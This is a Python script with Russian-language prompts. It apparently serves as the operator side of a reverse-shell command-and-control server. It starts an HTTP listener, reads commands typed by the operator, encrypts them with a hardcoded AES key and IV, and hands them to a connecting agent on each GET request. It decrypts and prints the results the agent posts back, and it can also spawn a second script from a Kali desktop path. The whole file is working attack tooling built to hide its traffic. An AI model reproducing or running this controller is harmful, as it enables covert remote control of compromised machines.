import http.server
import os
import subprocess
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import base64

AESKey = base64.b64decode('NB2uFaU1EM79EHEkiDvFGHkrLp40jRUP8DG8389lgMg=')
AESIV = base64.b64decode('qrq1cMUxC7S0G7xo9tC5nQ==')

def banner():
    print("*******************")
    print("*******************")
    print("*******************")

def encrypt(command):
    cipher = AES.new(AESKey, AES.MODE_CBC, AESIV)
    padded_data = pad(command.encode(), AES.block_size)
    encrypted_data = cipher.encrypt(padded_data)
    return base64.b64encode(encrypted_data).decode()

def decrypt(encrypted_command):
    cipher = AES.new(AESKey, AES.MODE_CBC, AESIV)
    encrypted_data = base64.b64decode(encrypted_command)
    decrypted_data = cipher.decrypt(encrypted_data)
    unpadded_data = unpad(decrypted_data, AES.block_size)
    return unpadded_data.decode()    
    
answer = input("нужны ли доп. соединения (yes/no): ")
banner()
if answer.lower() == "yes":
    subprocess.Popen(['qterminal', '-e', 'python3', '/home/kali/Desktop/tst.py'])

    
def start_server():
    banner()
    ip_addr = input("Введите адрес: ")
    port = int(input("Введите порт: "))
    server_address = (ip_addr, port)
    banner()
    
    class MyHandler(http.server.BaseHTTPRequestHandler):
        
        def do_GET(s):
            encrypted_command = input(">>>> ")
            encrypted_command = encrypt(encrypted_command)
            s.send_response(200)
            s.send_header("Content-type", "text/html")
            s.end_headers()
            s.wfile.write(encrypted_command.encode())
        
        def do_POST(s):
            s.send_response(200)
            s.end_headers()
            content_length = int(s.headers['Content-Length'])
            post_data = s.rfile.read(content_length)
            decrypted_data = decrypt(post_data.decode())
            print(decrypted_data)
    try:
        with http.server.HTTPServer(server_address, MyHandler) as httpd:
            print("Сервер стартовал")
            httpd.serve_forever()
            
    except KeyboardInterrupt:
        print("  Выключено")
        banner()
        
start_server()
